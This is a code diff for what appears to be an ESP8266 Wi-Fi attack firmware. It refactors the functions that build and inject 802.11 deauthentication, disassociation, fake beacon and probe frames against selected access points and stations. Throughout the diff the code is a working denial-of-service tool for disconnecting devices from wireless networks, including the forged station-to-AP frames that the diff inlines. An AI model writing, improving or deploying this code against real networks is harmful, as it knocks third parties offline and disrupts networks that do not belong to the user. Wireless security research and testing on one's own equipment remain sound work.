@@ -23,7 +23,8 @@ void Attack::start() {
   prntln(A_START);
   attackTime = currentTime;
   attackStartTime = currentTime;
-  //accesspoints.sortAfterChannel();
+  accesspoints.sortAfterChannel();
+  stations.sortAfterChannel();
   running = true;
 }
 
@@ -41,6 +42,8 @@ void Attack::start(bool beacon, bool deauth, bool deauthAll, bool probe, bool ou
     start();
   } else {
     prntln(A_NO_MODE_ERROR);
+    accesspoints.sort();
+    stations.sort();
     stop();
   }
 }
@@ -131,6 +134,10 @@ String Attack::getStatusJSON() {
 void Attack::update() {
   if (!running || scan.isScanning()) return;
 
+  apCount = accesspoints.count();
+  stCount = stations.count();
+  nCount = names.count();
+    
   // run/update all attacks
   deauthUpdate();
   deauthAllUpdate();
@@ -150,28 +157,28 @@ void Attack::deauthUpdate() {
   if (!deauthAll && deauth.active && deauth.maxPkts > 0 && deauth.packetCounter < deauth.maxPkts) {
     if (deauth.time <= currentTime - (1000 / deauth.maxPkts)) {
       // APs
-      if (accesspoints.count() > 0 && deauth.tc < accesspoints.count()) {
+      if (apCount > 0 && deauth.tc < apCount) {
         if (accesspoints.getSelected(deauth.tc)) {
           deauth.tc += deauthAP(deauth.tc);
         } else deauth.tc++;
       }
 
       // Stations
-      else if (stations.count() > 0 && deauth.tc >= accesspoints.count() && deauth.tc < stations.count() + accesspoints.count()) {
-        if (stations.getSelected(deauth.tc - accesspoints.count())) {
-          deauth.tc += deauthStation(deauth.tc - accesspoints.count());
+      else if (stCount > 0 && deauth.tc >= apCount && deauth.tc < stCount + apCount) {
+        if (stations.getSelected(deauth.tc - apCount)) {
+          deauth.tc += deauthStation(deauth.tc - apCount);
         } else deauth.tc++;
       }
 
       // Names
-      else if (names.count() > 0 && deauth.tc >= accesspoints.count() + stations.count() && deauth.tc < names.count() + stations.count() + accesspoints.count()) {
-        if (names.getSelected(deauth.tc - stations.count() - accesspoints.count())) {
-          deauth.tc += deauthName(deauth.tc - stations.count() - accesspoints.count());
+      else if (nCount > 0 && deauth.tc >= apCount + stCount && deauth.tc < nCount + stCount + apCount) {
+        if (names.getSelected(deauth.tc - stCount - apCount)) {
+          deauth.tc += deauthName(deauth.tc - stCount - apCount);
         } else deauth.tc++;
       }
 
       // reset counter
-      if (deauth.tc >= names.count() + stations.count() + accesspoints.count())
+      if (deauth.tc >= nCount + stCount + apCount)
         deauth.tc = 0;
     }
   }
@@ -181,7 +188,7 @@ void Attack::deauthAllUpdate() {
   if (deauthAll && deauth.active && deauth.maxPkts > 0 && deauth.packetCounter < deauth.maxPkts) {
     if (deauth.time <= currentTime - (1000 / deauth.maxPkts)) {
       // APs
-      if (accesspoints.count() > 0 && deauth.tc < accesspoints.count()) {
+      if (apCount > 0 && deauth.tc < apCount) {
         tmpID = names.findID(accesspoints.getMac(deauth.tc));
         if (tmpID < 0) {
           deauth.tc += deauthAP(deauth.tc);
@@ -191,24 +198,24 @@ void Attack::deauthAllUpdate() {
       }
 
       // Stations
-      else if (stations.count() > 0 && deauth.tc >= accesspoints.count() && deauth.tc < stations.count() + accesspoints.count()) {
-        tmpID = names.findID(stations.getMac(deauth.tc - accesspoints.count()));
+      else if (stCount > 0 && deauth.tc >= apCount && deauth.tc < stCount + apCount) {
+        tmpID = names.findID(stations.getMac(deauth.tc - apCount));
         if (tmpID < 0) {
-          deauth.tc += deauthStation(deauth.tc - accesspoints.count());
+          deauth.tc += deauthStation(deauth.tc - apCount);
         } else if (!names.getSelected(tmpID)) {
-          deauth.tc += deauthStation(deauth.tc - accesspoints.count());
+          deauth.tc += deauthStation(deauth.tc - apCount);
         } else deauth.tc++;
       }
 
       // Names
-      else if (names.count() > 0 && deauth.tc >= accesspoints.count() + stations.count() && deauth.tc < accesspoints.count() + stations.count() + names.count()) {
-        if (!names.getSelected(deauth.tc - accesspoints.count() - stations.count())) {
-          deauth.tc += deauthName(deauth.tc - accesspoints.count() - stations.count());
+      else if (nCount > 0 && deauth.tc >= apCount + stCount && deauth.tc < apCount + stCount + nCount) {
+        if (!names.getSelected(deauth.tc - apCount - stCount)) {
+          deauth.tc += deauthName(deauth.tc - apCount - stCount);
         } else deauth.tc++;
       }
 
       // reset counter
-      if (deauth.tc >= names.count() + stations.count() + accesspoints.count())
+      if (deauth.tc >= nCount + stCount + apCount)
         deauth.tc = 0;
     }
   }
@@ -233,15 +240,15 @@ void Attack:: beaconUpdate() {
   }
 }
 
-bool Attack::deauthStation(uint8_t num) {
+bool Attack::deauthStation(int num) {
   return deauthDevice(accesspoints.getMac(stations.getAP(num)), stations.getMac(num), settings.getDeauthReason(), accesspoints.getCh(stations.getAP(num)));
 }
 
-bool Attack::deauthAP(uint8_t num) {
+bool Attack::deauthAP(int num) {
   return deauthDevice(accesspoints.getMac(num), broadcast, settings.getDeauthReason(), accesspoints.getCh(num));
 }
 
-bool Attack::deauthName(uint8_t num) {
+bool Attack::deauthName(int num) {
   if (names.isStation(num)) {
     return deauthDevice(names.getBssid(num), names.getMac(num), settings.getDeauthReason(), names.getCh(num));
   } else {
@@ -253,7 +260,7 @@ bool Attack::deauthDevice(uint8_t* apMac, uint8_t* stMac, uint8_t reason, uint8_
   if (!stMac) return false; // exit when station mac is null
 
   //Serial.println("Deauthing "+macToStr(apMac)+" -> "+macToStr(stMac)); // for debugging
-
+  
   bool success = false;
 
   // build deauth packet
@@ -265,22 +272,36 @@ bool Attack::deauthDevice(uint8_t* apMac, uint8_t* stMac, uint8_t reason, uint8_
 
   // send deauth frame
   deauthPacket[0] = 0xc0;
-  if (sendPacket(deauthPacket, packetSize, &deauth.packetCounter, ch, settings.getForcePackets()))
+  if (sendPacket(deauthPacket, packetSize, ch, settings.getForcePackets()))
     success = true;
 
   // send disassociate frame
   deauthPacket[0] = 0xa0;
-  if (sendPacket(deauthPacket, packetSize, &deauth.packetCounter, ch, settings.getForcePackets()))
+  if (sendPacket(deauthPacket, packetSize, ch, settings.getForcePackets()))
     success = true;
-
+  
   // send another packet, this time from the station to the accesspoint
   if (!macBroadcast(stMac)) { // but only if the packet isn't a broadcast
-    if (deauthDevice(stMac, apMac, reason, ch)) {
+    // build deauth packet
+    memcpy(&deauthPacket[4], apMac, 6);
+    memcpy(&deauthPacket[10], stMac, 6);
+    memcpy(&deauthPacket[16], stMac, 6);
+  
+    // send deauth frame
+    deauthPacket[0] = 0xc0;
+    if (sendPacket(deauthPacket, packetSize, ch, settings.getForcePackets()))
       success = true;
-    }
+  
+    // send disassociate frame
+    deauthPacket[0] = 0xa0;
+    if (sendPacket(deauthPacket, packetSize, ch, settings.getForcePackets()))
+      success = true;
   }
 
-  if (success) deauth.time = currentTime;
+  if (success){
+    deauth.time = currentTime;
+    deauth.packetCounter++;
+  }
 
   return success;
 }
@@ -310,8 +331,9 @@ bool Attack::sendBeacon(uint8_t* mac, const char* ssid, uint8_t ch, bool wpa2) {
   
   beaconPacket[82] = ch;
 
-  if (sendPacket(beaconPacket, packetSize, &beacon.packetCounter, ch, settings.getForcePackets())) {
+  if (sendPacket(beaconPacket, packetSize, ch, settings.getForcePackets())) {
     beacon.time = currentTime;
+    beacon.packetCounter++;
     return true;
   }
   
@@ -332,30 +354,29 @@ bool Attack::sendProbe(uint8_t* mac, const char* ssid, uint8_t ch) {
   memcpy(&probePacket[10], mac, 6);
   memcpy(&probePacket[26], ssid, ssidLen);
 
-  if (sendPacket(probePacket, packetSize, &probe.packetCounter, ch, settings.getForcePackets())) {
+  if (sendPacket(probePacket, packetSize, ch, settings.getForcePackets())) {
     probe.time = currentTime;
+    probe.packetCounter++;
     return true;
   }
   
   return false;
 }
 
-bool Attack::sendPacket(uint8_t* packet, uint16_t packetSize, uint16_t* packetCounter, uint8_t ch, uint16_t tries) {
+bool Attack::sendPacket(uint8_t* packet, uint16_t packetSize, uint8_t ch, uint16_t tries) {
   //Serial.println(bytesToStr(packet, packetSize));
 
   // set channel
   setWifiChannel(ch);
-
+  
   // sent out packet
   bool sent = wifi_send_pkt_freedom(packet, packetSize, 0) == 0;
-
+  
   // try again until it's sent out
   for (int i = 0; i < tries && !sent; i++) {
-    yield();
     sent = wifi_send_pkt_freedom(packet, packetSize, 0) == 0;
   }
 
-  if (sent) (*packetCounter)++;
   return sent;
 }
 
